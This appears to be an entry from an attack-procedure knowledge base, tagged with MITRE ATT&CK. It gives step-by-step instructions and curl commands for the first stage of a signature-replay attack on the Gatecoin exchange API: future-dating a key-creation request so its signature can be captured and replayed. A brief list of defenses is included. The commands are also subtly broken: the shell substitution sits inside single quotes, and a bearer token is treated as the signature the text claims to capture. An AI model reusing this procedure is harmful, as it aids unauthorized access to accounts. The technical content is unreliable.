---
id: proc-gatecoin-initial-request
name: Generate Initial API Request with Future Timestamp
tags:
  - api-request
  - timestamp-manipulation
type: procedure
tools:
  - '[[tools/reuse_signature_gatecoin.py]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-create-readonly-key]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:32:20.798Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Generate Initial API Request with Future Timestamp

## Summary

This procedure crafts an authenticated API request to Gatecoin for creating a read-only API key, setting the timestamp 3 seconds in the future relative to the client's clock (which is ahead of the server), allowing the signature to be captured for later reuse in a replay attack.

## Description

The Gatecoin API signs requests using a mechanism that excludes the payload body, relying only on timestamp and parameters. By setting a future timestamp, the request can be delayed and replayed after the server's 5-minute signature cache expires but before the timestamp falls outside the 5-minute validation window. This step requires valid account credentials and network access to the API. Prerequisites include a slightly advanced client clock and interception capabilities.

## Requirements

1. Valid Gatecoin API token for authentication
2. Client system clock set 3 seconds ahead of server time
3. Network access to Gatecoin API endpoints
4. Tool for request interception or crafting (e.g., curl or Burp Suite)

## Defense

Defensive measures and detection strategies:

- Include payload in signature hashing to prevent modification
- Implement nonce or unique request IDs to block replays
- Synchronize client-server clocks strictly and shorten timestamp windows
- Monitor for repeated signature usage or unusual key creation patterns

## Objectives

1. Generate a signed API request for read-only key creation
2. Ensure timestamp is future-dated for timing window exploitation
3. Extract signature for reuse in subsequent steps

## Instructions

### Step 1: Prepare the Request Payload

**Context**: Define the JSON payload for creating a read-only API key, excluding full privileges to avoid immediate suspicion.

**Command** ([[commands/curl-create-readonly-key]]):
```bash
curl -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer YOUR_API_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"name": "readonly-key", "permissions": ["read"], "timestamp": "$(date -u +%s%3N --date='+3 seconds')"}' \
  --output initial_request.json
```

> This command sends the request and saves the response. The timestamp is calculated 3 seconds in the future using date. Expected output: JSON response with the created key details or error if invalid; capture the Authorization header signature.

### Step 2: Intercept and Extract Signature

**Context**: If not using direct curl, intercept the request to extract the signature from headers.

**Command** ([[commands/curl-create-readonly-key]] with verbose):
```bash
curl -v -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer YOUR_API_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"name": "readonly-key", "permissions": ["read"], "timestamp": "$(date -u +%s%3N --date='+3 seconds')"}'
```

> Verbose mode (-v) shows headers including the signature. Expected output: Full request/response trace with signature visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/curl-create-readonly-key]]

## Tools Used

- [[tools/reuse_signature_gatecoin.py]]

## Tags

- [[api-request]]
- [[timestamp-manipulation]]
